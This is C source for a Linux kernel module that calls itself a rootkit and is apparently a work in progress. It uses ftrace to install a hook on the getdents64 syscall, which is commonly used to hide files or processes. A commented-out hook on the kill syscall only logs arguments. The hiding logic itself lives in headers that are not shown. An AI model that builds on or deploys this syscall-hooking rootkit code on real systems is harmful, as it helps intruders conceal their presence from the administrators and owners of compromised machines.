// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/init.h>

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo add include protection in header
#include "getdents_hook.h"


///////////////////////////////////////////// OLD SECTION TO HOOK KILL REMOVE IT

// TODO dont forget PTREGS macro
static asmlinkage long (*orig_kill)(const struct pt_regs*);

asmlinkage int hook_kill(const struct pt_regs* regs)
{

    /// do some logic before calling original function
    pid_t pid = regs->di;
    int sig = regs->si;
    pr_info("IN PTREGS pid is %d, sig is %d\n", pid, sig);

    return orig_kill(regs);

}

// define which functions to hook
static struct ftrace_hook hooks[] = {
 //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    return 0;
}


// Module cleanup: Restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("reached rootkit_exit.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
